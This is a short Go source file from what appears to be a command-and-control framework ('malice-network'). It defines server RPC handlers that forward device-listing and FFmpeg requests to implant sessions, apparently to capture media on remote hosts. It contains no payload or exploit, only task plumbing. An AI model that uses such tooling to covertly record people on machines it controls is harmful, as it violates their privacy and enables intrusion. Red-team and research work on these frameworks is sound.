package rpc

import (
	"context"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
	"github.com/chainreactors/malice-network/helper/types"
	"github.com/chainreactors/malice-network/helper/utils/handler"
)

func (rpc *Server) ListDevice(ctx context.Context, req *implantpb.Request) (*clientpb.Task, error) {
	err := handler.AssertRequestName(req, consts.ModuleFFmpeg)
	if err != nil {
		return nil, err
	}
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}
	ch, err := rpc.GenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}

	go greq.HandlerResponse(ch, types.MsgListModule, handlerModule(greq.Session))
	return greq.Task.ToProtobuf(), nil
}

func (rpc *Server) FFmpeg(ctx context.Context, req *implantpb.FFmpegRequest) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}
	ch, err := rpc.GenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}
	greq.Task.Type = req.Action
	go greq.HandlerResponse(ch, types.MsgResponse)
	return greq.Task.ToProtobuf(), nil
}
